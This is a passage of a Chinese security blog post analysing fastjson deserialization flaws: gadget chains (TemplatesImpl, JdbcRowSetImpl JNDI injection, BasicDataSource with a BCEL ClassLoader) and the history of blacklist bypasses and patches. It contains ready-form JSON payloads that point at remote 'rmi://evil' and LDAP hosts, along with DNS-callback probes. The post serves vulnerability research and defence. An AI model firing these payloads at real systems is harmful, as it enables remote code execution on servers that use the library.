+<p>看到后续他将当前这个JSONObject实例进行了obj to str的操作，也就是我们使用静态函数<code>JSON.toJSONString</code>来序列化数据一样，这里将会调用当前这个类的所有符合条件的getters（这里的条件比调用parse时宽松，他对返回类型无限制）。</p>
+<p>那么我们只要在反序列化过程中，找到一处可以使用JSONObject调用toString的地方就可以了</p>
+<p><code>com/alibaba/fastjson/parser/DefaultJSONParser.java#parseObject</code></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200410121100651.png" alt="image-20200410121100651"></p>
+<p>这里有一处如果当前object为JSONObject类型时，将会对当前的这个key调用<code>toString</code>函数。这里在处理过程中，我们可以知道如果遇到<code>{</code>，fastjson会加一层JSONObject。</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200410122509759.png" alt="image-20200410122509759"></p>
+<p>那么，我们只需要构造一个类似</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;some&#125;:x&#125;</span><br></pre></td></tr></table></figure>
+<p>这种方式，此时的key为<code>{}</code>(也就是下一层的JSONObject)，value为<code>x</code>。我们就可以使得fastjson去调用<code>key.toString</code>函数，这个<code>toString</code>的过程也就是将key调用<code>toJSONString</code>的过程，意味着将会调用当前key对象的所有getters。到这里我们就可以使parse函数拥有与parseObject一样的执行效果，以下面的poc为例。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;// 第一层JSONObject，他的key为另外一个JSONObject</span><br><span class="line">		&#123;// 下一层JSONObject，他的内容将会调用toJSONString</span><br><span class="line">			"x":&#123;// 具体触发点为getConnection</span><br><span class="line">				"@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",</span><br><span class="line">				"driverClassLoader": &#123;"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"&#125;,		</span><br><span class="line">        "driverClassName": "$$BCEL$$$l$8b$I$A$..."</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;:"x"</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="第二种：-ref点"><a href="#第二种：-ref点" class="headerlink" title="第二种：$ref点"></a>第二种：<code>$ref</code>点</h4><p>当fastjson版本&gt;=1.2.36时，我们可以使用<code>$ref</code>的方式来调用任意的getter</p>
+<p>以1.2.48版本为例，首先看一下遇到<code>$ref</code>是怎么处理的</p>
+<p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject#388</code></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200411145506512.png" alt="image-20200411145506512"></p>
+<p>当遇到引用<code>$ref</code>这种方式，会增加一个resolveTask，留在parse结束后进行处理</p>
+<p><code>com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask</code></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200411145811138.png" alt="image-20200411145811138"></p>
+<p>调用<code>JSONPath.eval</code>，关于JSONPath的<a href="https://github.com/alibaba/fastjson/wiki/JSONPath" target="_blank" rel="noopener">介绍</a></p>
+<p>这里的eval函数最终会去调用<code>JSONPath.getPropertyValue</code>函数（这里其实是可以根据我们传入的内容去调用不同的Segement，比如这里用了<strong>$.value</strong>的方式使用的是PropertySegement）</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200411153340074.png" alt="image-20200411153340074"></p>
+<p>后续就不详细分析了，这里如果存在相应的getter，就会去invoke这个函数；如果没有，那么就会用反射机制去获取属性的值。</p>
+<p>这里举个例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">json = <span class="string">"&#123;"</span> +</span><br><span class="line">          <span class="string">"\"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\","</span> +</span><br><span class="line">          <span class="string">"\"driverClassLoader\": &#123;\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"&#125;,"</span> +</span><br><span class="line">          <span class="string">"\"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\","</span> +</span><br><span class="line">          <span class="string">"\"connection\":&#123;\"$ref\": \"$.connection\"&#125;"</span>+</span><br><span class="line">				<span class="string">"&#125;"</span>;</span><br></pre></td></tr></table></figure>
+<p>会去调用<code>getConnection</code>函数，这里也突破了parse到parseObject的效果</p>
+<h2 id="4-private属性"><a href="#4-private属性" class="headerlink" title="(4). private属性"></a>(4). private属性</h2><p>还有一点需要注意的是默认fastjon在转化时，如果没有setter函数，而是以反射机制来赋值的情况，会忽略private属性的转化。意味着如果我们在构造过程中，填充进去的属性是private的且没有setter，那么在转化过程中是不会被填入还原后的对象的。如果需要对private属性进行转化，那么需要设置<code>Feature.SupportNonPublicField</code></p>
+<h1 id="0x02-EXP分析"><a href="#0x02-EXP分析" class="headerlink" title="0x02 EXP分析"></a>0x02 EXP分析</h1><hr>
+<p>相比于Java反序列化利用链构造的复杂性，fastjson利用链主要是寻找可利用的getter、setter等，常见的几种POC如下文所示：</p>
+<h2 id="1-templatesimpl"><a href="#1-templatesimpl" class="headerlink" title="(1). templatesimpl"></a>(1). templatesimpl</h2><p>参考：<a href="http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/" target="_blank" rel="noopener">http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>
+<p>根据前面的分析，我们需要找到可以利用的构造函数、setter或getter函数。在分析Commons-Collections系统的利用链时，提到过templatesimpl的执行方式，通过载入bytecodes的方式来达到任意代码执行的效果(具体不再分析)。</p>
+<p>其中触发载入的函数为<code>newTransformer</code>函数，而很巧的是，templatesimpl存在一个getter调用了该函数</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200106232029570.png" alt="image-20200106232029570"></p>
+<p>那么很明显，我们可以直接填入<code>outputProperties</code>的方法来触发<code>getOutputProperties</code>（他恰巧无setter，返回值也符合条件）。但是有一个问题是我们需要填充的类属性都是private类型，要想执行该利用链，需要在调用parseObject函数时填入<code>Feature.SupportNonPublicField</code>。以下图为例，将调用计算器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String jsonString = <span class="string">"&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\","</span> +</span><br><span class="line">        <span class="string">"\"_name\":\"goodjob\",\"_tfactory\":&#123;&#125;,"</span> +</span><br><span class="line">        <span class="string">"\"_bytecodes\":[\"yv66vgAAADQAOgoAA...\"],"</span> +</span><br><span class="line">        <span class="string">"\"_outputProperties\":null&#125;"</span>;</span><br></pre></td></tr></table></figure>
+<p>这里的bytecodes可以用ysoserial工具来生成。在构造payload的时候，需要注意的是<code>_tfactory</code>必须填上，因为在执行过程中，如果它为null，会报错无法进入载入bytecodes的步骤。非常好的是，我们只要填上<code>_tfactory:{}</code>，fastjson会自动帮我们调用TransformerFactoryImpl（<em>tfactory的类）的无参构造函数进行实例化。`\</em>`在smartMatch函数被替换为空。</p>
+<p>除此之外，byte[]类型在fastjson转化中会被base64编码</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200106233142450.png" alt="image-20200106233142450"></p>
+<p>所以payload中是一长串base64的字串。</p>
+<p>可以看到这个poc其实限制还是挺大的，需要fastjson parseObject时填上<code>Feature.SupportNonPublicField</code>才可以。</p>
+<h2 id="2-基于JNDI的利用"><a href="#2-基于JNDI的利用" class="headerlink" title="(2). 基于JNDI的利用"></a>(2). 基于JNDI的利用</h2><p>我们都知道如果JNDI的lookup函数参数值可控，那么我们可以利用JNDI Reference的方法加载远程代码达成RCE利用。所以根据前面的分析，如果我们可以在<code>无参构造函数</code>、<code>符合条件的setter</code>、<code>符合条件的getter</code>里发现一个可控的lookup函数，我们就可以利用JNDI的注入方法来达成利用。</p>
+<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>JdbcRowSetImpl对象可以被我们用做上述的利用，来看一下他的代码</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200407105109680.png" alt="image-20200407105109680"></p>
+<p>这次出问题的地方在于setAutoCommit函数，该函数调用了connect函数来重新发起一个jdbc的连接</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200407105258958.png" alt="image-20200407105258958"></p>
+<p>在connect函数里我们可以看到调用了lookup函数，其参数值由<code>getDataSourceName</code>来获取，该函数主要返回属性<code>dataSource</code>，根据fastjson的利用原理，我们只需要填充<code>dataSource</code>和<code>autoCommit</code>就可以触发这里的JNDI注入。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://evil:1099/test"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>还有很多其他的可以用来JNDI注入的对象，比如<code>org.hibernate.jmx.StatisticsService</code>的<code>setSessionFactoryJNDIName</code>函数，原理一样不再叙述。</p>
+<h2 id="3-Tomcat-dbcp-BasicDataSource"><a href="#3-Tomcat-dbcp-BasicDataSource" class="headerlink" title="(3). Tomcat dbcp BasicDataSource"></a>(3). Tomcat dbcp BasicDataSource</h2><p>同1中的TemplateImpl，BasicDataSource也可以载入任意的对象来执行任意代码。先来讲一下他的原理</p>
+<p>前面的基础知识里提到了我们可以调用符合条件的getters，在<code>BasicDataSource</code>存在一个<code>getConnection</code>函数，他主要调用<code>createConnectionFactory</code></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200411132559759.png" alt="image-20200411132559759"></p>
+<p>在<code>createConnectionFactory</code>函数使用Class.forName加载类</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200411132736300.png" alt="image-20200411132736300"></p>
+<p>这部分driverClassName和driverClassLoader是可控的，这时候我们要用到的是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，这个ClassLoader可以从classname中提取出BCEL格式的class字节码，并调用defineClass进行载入</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200411134429055.png" alt="image-20200411134429055"></p>
+<p>这里我们可以写一个用了静态块的类来执行代码。</p>
+<h1 id="0x03-Fastjson历史版本修复措施"><a href="#0x03-Fastjson历史版本修复措施" class="headerlink" title="0x03 Fastjson历史版本修复措施"></a>0x03 Fastjson历史版本修复措施</h1><hr>
+<p>这一部分主要讲述几个重要版本的安全更新</p>
+<h3 id="1-fastjson-1-2-25"><a href="#1-fastjson-1-2-25" class="headerlink" title="(1). fastjson == 1.2.25"></a>(1). fastjson == 1.2.25</h3><p>默认关闭<code>AutoType</code>，需要手动开启<code>@type</code>的支持，见<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">enable_autotype</a></p>
+<p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200411232403665.png" alt="image-20200411232403665"></p>
+<p>当遇到<code>@type</code>时，会先<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>。该函数的一个主要逻辑（1.2.25版本）</p>
+<ol>
+<li><p>开启了<code>AutoType</code>时，会过一次黑名单和白名单检测（先检测白名单，后检测黑名单）。</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200412223524510.png" alt="image-20200412223524510"></p>
+<p>优先载入人工配置的白名单类，并对黑名单类爆出异常；</p>
+</li>
+<li><p>这里先忽略未开启<code>AutoType</code>时的检测处理</p>
+</li>
+<li><p>前面的情况都不符合，并且开启了<code>AutoType</code>，则尝试去载入任意类，但是不可以载入ClassLoader和DataSource的子类</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200412224904669.png" alt="image-20200412224904669"></p>
+</li>
+</ol>
+<p>这里载入的方法用的都是<code>TypeUtils.loadClass</code>，来看一下他的一个处理</p>
+<ul>
+<li><p>首先他对于<code>Lxxx.class.xxx;</code>的类表示方法做<code>L</code>,<code>;</code>的剔除，递归调用loadClass去调用内部的具体类</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200412232825982.png" alt="image-20200412232825982"></p>
+</li>
+<li><p>后续的调用方法为使用<code>AppClassLoader.loadClass</code>或<code>Class.forName</code>去加载类</p>
+</li>
+</ul>
+<h4 id="开启AutoType的情况下绕过黑名单检测"><a href="#开启AutoType的情况下绕过黑名单检测" class="headerlink" title="开启AutoType的情况下绕过黑名单检测"></a>开启<code>AutoType</code>的情况下绕过黑名单检测</h4><p>根据上面的分析，如果开启了<code>AutoType</code>，那么如果是在白名单里的类，直接加载，对于在黑名单内的类直接抛出异常。</p>
+<p>而黑名单的检测方式是去匹配当前的类名<code>class.startsWith(deny)</code></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200412233730761.png" alt="image-20200412233730761"></p>
+<p>而在这个黑名单里显然并没有考虑到<code>TypeUtils.loadClass</code>实现中，对于<code>Lxxxx.class.xxx;</code>的处理。</p>
+<p>通过<code>Lxxxxx;</code>的方式<code>startsWith</code>没办法正常匹配出来，所以我们可以绕过黑名单的检测。</p>
+<h3 id="2-fastjson-1-2-42"><a href="#2-fastjson-1-2-42" class="headerlink" title="(2). fastjson == 1.2.42"></a>(2). fastjson == 1.2.42</h3><p>在这个版本，对上面的黑名单检测绕过做了修复，并且将黑名单里的类型进行hash处理，增加了分析难度；</p>
+<p>对于前面<code>Lxxxxx;</code>的绕过，42版本添加了以下代码来剔除（因为黑名单已经变成了hash比较的方式，这里<code>L;</code>都以这种方式来确认）</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200413114125856.png" alt="image-20200413114125856"></p>
+<p>但是这里的处理治标不治本，我们使用<code>LLxxxxx;;</code>这种方式就可以绕过。</p>
+<p>除此之外，由于现在的黑名单变成了hash计算的方式，给我们分析增加了不少难度，不过有大佬对黑名单hash做了还原见<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">fastjson-blacklist</a></p>
+<h3 id="3-fastjson-1-2-43"><a href="#3-fastjson-1-2-43" class="headerlink" title="(3). fastjson == 1.2.43"></a>(3). fastjson == 1.2.43</h3><p>这个版本主要修复了上面<code>LLxxxx;;</code>的方式</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200413125108171.png" alt="image-20200413125108171"></p>
+<p>做了两次检测，如果碰上<code>LLxxxxx;;</code>的方式则直接爆出异常</p>
+<h3 id="4-fastjson-1-2-48"><a href="#4-fastjson-1-2-48" class="headerlink" title="(4). fastjson == 1.2.48"></a>(4). fastjson == 1.2.48</h3><h4 id="修复前的版本"><a href="#修复前的版本" class="headerlink" title="修复前的版本"></a>修复前的版本</h4><p>在48版本之前，<code>checkAutoType</code>还存在这样一个逻辑（以1.2.47为例）</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200413130933666.png" alt="image-20200413130933666"></p>
+<p>当开启<code>AutoType</code>时，如果mappings里面存在这个类，那么就算这个类在黑名单里，也允许他进行下一步操作</p>
+<p>PS：这里的mappings是fastjson提早载入的一些缓存类</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200413131026571.png" alt="image-20200413131026571"></p>
+<p>后续如果能从mappings里面得到这个类，就直接返回。那么我们有没有什么方法将我们需要的类加入到这个mappings里呢？</p>
+<p>先来看一下<code>deserializers.findClass</code>，在<code>deserializers</code>里面预先填充了一些类与其反序列化器的实例</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200413131650373.png" alt="image-20200413131650373"></p>
+<p>这里我们主要关注一下<code>Class.class</code>，他所对应的反序列化器为<code>MiscCodec</code>，<code>checkAutoType</code>检测过后，后续将调用反序列化器的<code>deserialze</code>函数。来看看MiscCodec的这个函数对于<code>Class.class</code>的处理</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200413132337804.png" alt="image-20200413132337804"></p>
+<p>他调用了<code>TypeUtils.loadClass</code>函数，前面我们讲过，他将使用<code>ClassLoader.loadClass</code>或<code>Class.forName</code>来载入类，在这一过程中，涉及到了<code>mappings</code>的操作</p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200413132644597.png" alt="image-20200413132644597"></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200413132704804.png" alt="image-20200413132704804"></p>
+<p>这里的<code>cache</code>默认为<code>true</code>，所以这里会直接将载入后的对象填入<code>mappings</code></p>
+<p>根据我们前面的分析，如果当前<code>mappings</code>里存在可控的类，那么不管开没开启<code>AutoType</code>，都会进行类还原；同时我们利用<code>Class.class</code>可以向<code>mappings</code>填充任意类，这导致绕过了前面的检测；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 举个例子</span></span><br><span class="line">json = <span class="string">"&#123;"</span> + <span class="comment">// 用Class载入com.sun.rowset.JdbcRowSetImpl，并缓存到mappings</span></span><br><span class="line">          <span class="string">"&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span> +</span><br><span class="line">  					<span class="comment">// 后续使用mappings里的com.sun.rowset.JdbcRowSetImpl来还原对象</span></span><br><span class="line">          <span class="string">"&#123;\"@type\": \"com.sun.rowset.JdbcRowSetImpl\","</span> +</span><br><span class="line">          <span class="string">"\"dataSourceName\": \"ldap://localhost:1389/Exploit\","</span> +</span><br><span class="line">          <span class="string">"\"autoCommit\": true&#125;"</span> +</span><br><span class="line">        <span class="string">"&#125;"</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="修复后的版本"><a href="#修复后的版本" class="headerlink" title="修复后的版本"></a>修复后的版本</h4><p>在1.2.48版本上对其进行了修复</p>
+<p>在<code>MiscCodec</code>对Class的处理中，修改了<code>cache=false</code></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200413134143022.png" alt="image-20200413134143022"></p>
+<p>并且对于<code>TypeUtils.loadClass</code>里的<code>mappings</code>操作都依赖于<code>cache</code>，如果为<code>false</code>则不添加到<code>mappings</code>里（在前面的版本里<code>Class.forName</code>部分并不依赖cache，48版本之后增加了对cache的判断）</p>
+<p>与此同时，<code>java.lang.Class</code>也被加入到了黑名单里面</p>
+<h3 id="5-后续版本"><a href="#5-后续版本" class="headerlink" title="(5). 后续版本"></a>(5). 后续版本</h3><p>后续版本的绕过主要围绕在：</p>
+<ul>
+<li>开启<code>AutoType</code>，绕过黑名单检测</li>
+<li>利用<code>deserializers</code>里面的类(跟<code>Class.class</code>一个原理)</li>
+</ul>
+<p>最新版1.2.68引入了<a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode" target="_blank" rel="noopener">safeMode</a>，在<code>checkAutoType</code>里添加了下面判断，如果开启了safemode，那么将不允许进行<code>@type</code></p>
+<p><img src="/assets/talk-about-fastjson-deserialization-20200413/image-20200413161935377.png" alt="image-20200413161935377"></p>
+<p>不过这个并不是默认开启的，需要人工去配置。</p>
+<h3 id="6-后续版本觉得有意思的利用"><a href="#6-后续版本觉得有意思的利用" class="headerlink" title="(6). 后续版本觉得有意思的利用"></a>(6). 后续版本觉得有意思的利用</h3><ul>
+<li><p>fastjson &lt; 1.2.60 dos <a href="http://m0d9.me/2019/09/06/Fastjson-1-2-60-Dos分析/" target="_blank" rel="noopener">Fastjson-1-2-60-Dos</a></p>
+</li>
+<li><p>使用dnslog来检测fastjson漏洞 <a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/issues/3077</a></p>
+<p>这里的原理跟<code>Class.class</code>是一样的，只是换成了<code>java.net.URL</code>、<code>java.net.Inet4Address</code>、<code>java.net.Inet6Address</code>，由MiscCodec处理时会去触发dns查询</p>
+<p>当然这里的触发URL的触发用的ysoserial里面的URLDNS的方式，由hashcode去触发；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://s81twxdise25yxjinqaar74iq9wzko.burpcollaborator.net&quot;&#125;:&quot;aaa&quot;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><hr>
+<p>到这里fastjson相关的知识点就梳理结束了，这其中开发者与安全研究人员的攻防交互真是令人称快！后续如果有其他的绕过，还会继续写下去。</p>
+<p>总结一下fastjson利用中的特色：</p>
+<ul>
+<li>反序列化时主动触发符合条件的setters和getters，其中使用parse和parseObject函数，在getter利用上parseObject的限制更低一点；但是这里我们可以利用本文的两种方法将parse的调用效果转化为parseObject</li>
+<li><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>是个好东西</li>
+<li>fastjson的黑名单绕过来看，基本上找的都是jndi相关的利用，或许可以扩展一些其他的？</li>
+<li>有时候开发者理解不到位，打得补丁可以轻松被绕过，所以需要紧盯补丁的情况</li>
+</ul>
+
+  	</div>
+	  
+	  <div class="article-tags tags">
+      
+        <a href="/tags/vul/">vul</a>
+      
+	  </div>
+    
+
+	
+		<div class="art-item-footer">
+				
+				
+					<span class="art-item-right">next：<a href="/2020/03/10/java-jmx-rmi/" rel="next"  title="【notes】攻击Java JMX-RMI">
+						【notes】攻击Java JMX-RMI
+					</a><i class="icon icon-chevron-thin-right"></i></span>
+				
+		</div>
+	
+	</section>
+	
+		<section id="comments">
+			<div id="disqus_thread"></div>
+		</section>
+	
+</article>
+<script>
+	window.subData = {
+		title: '【notes】浅谈fastjson反序列化漏洞',
+		tools: true
+	}
+</script>
+
+      </div>
+      <aside class='l_side'>
+        
+  <section class='m_widget about'>
+
+<div class='header'>wh1t3p1g</div>
+<div class='content'>
+<div class='desc'>A Web 🐶 &amp;&amp; Code Reviewer</div>
+</div>
+</section>
+
+  <section class='m_widget links'>
+<div class='header'>Links</div>
+<div class='content'>
+    <ul class="entry">
+    
+        <li><a class="flat-box" target="_blank" href="http://blog.orleven.com">
+            <div class='name'>orleven</div>
+        </a></li>
+    
+        <li><a class="flat-box" target="_blank" href="http://www.warmeng.com">
+            <div class='name'>warmeng</div>
+        </a></li>
+    
+        <li><a class="flat-box" target="_blank" href="http://fr4nk.0kami.cn">
+            <div class='name'>fr4nk</div>
+        </a></li>
+    
+    </ul>
+</div>
+</section>
+
+  <section class='m_widget categories'>
+<div class='header'>Categories</div>
+<div class='content'>
+    
+    <ul class="entry">
+    
+        <li><a class="flat-box" href="/categories/codereview/"><div class='name'>codereview</div><div class='badget'>10</div></a></li>
+    
+        <li><a class="flat-box" href="/categories/ctf/"><div class='name'>ctf</div><div class='badget'>5</div></a></li>
+    
+        <li><a class="flat-box" href="/categories/notes/"><div class='name'>notes</div><div class='badget'>21</div></a></li>
+    
+    </ul>
+    
+</div>
+</section>
+
+  
+<div class="m_widget tagcloud">
+    <div class="header">Tags</div>
+    <div class='content'>
+        <a href="/tags/bctf/" style="font-size: 14px; color: #808080">bctf</a> <a href="/tags/cms/" style="font-size: 18px; color: #2b2b2b">cms</a> <a href="/tags/cve/" style="font-size: 16px; color: #555">cve</a> <a href="/tags/ddctf/" style="font-size: 14px; color: #808080">ddctf</a> <a href="/tags/hitbxctf/" style="font-size: 14px; color: #808080">hitbxctf</a> <a href="/tags/mobile/" style="font-size: 14px; color: #808080">mobile</a> <a href="/tags/njctf/" style="font-size: 14px; color: #808080">njctf</a> <a href="/tags/others/" style="font-size: 16px; color: #555">others</a> <a href="/tags/suctf/" style="font-size: 14px; color: #808080">suctf</a> <a href="/tags/vul/" style="font-size: 20px; color: #000">vul</a>
+    </div>
+</div>
+
+
+
+      </aside>
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+  </div>
+  <footer id="footer" class="clearfix">
+
+	<div class="social-wrapper">
+  	
+      
+        <a href="https://github.com/wh1t3p1g" class="social github"
+          target="_blank" rel="external">
+          <span class="icon icon-github"></span>
+        </a>
+      
+        <a href="/atom.xml" class="social rss"
+          target="_blank" rel="external">
+          <span class="icon icon-rss"></span>
+        </a>
+      
+    
+  </div>
+  
+  <div>Theme <a href='https://github.com/stkevintan/hexo-theme-material-flow' class="codename">MaterialFlow</a> designed by <a href="http://keyin.me/" target="_blank">Kevin Tan</a>.</div>
+  
+</footer>
+
+
+  <script>setLoadingBarProgress(80);</script>
+  
+<script>
+  var disqus_shortname = '0kami';
+  
+  var disqus_url = 'http://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src='//cdn.bootcss.com/node-waves/0.7.5/waves.min.js'></script>
+<script src="//cdn.bootcss.com/scrollReveal.js/3.3.2/scrollreveal.min.js"></script>
+<script src="/js/jquery.fitvids.js"></script>
+<script>
+	var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+	var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+	var ALGOLIA_API_KEY = "";
+	var ALGOLIA_APP_ID = "";
+	var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var BAIDU_API_ID = "";
+  var SEARCH_SERVICE = "hexo";
+  var ROOT = "/"||"/";
+  if(!ROOT.endsWith('/'))ROOT += '/';
+</script>
+<script src="/js/search.js"></script>
+<script src="/js/app.js"></script>
+
+
+  <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
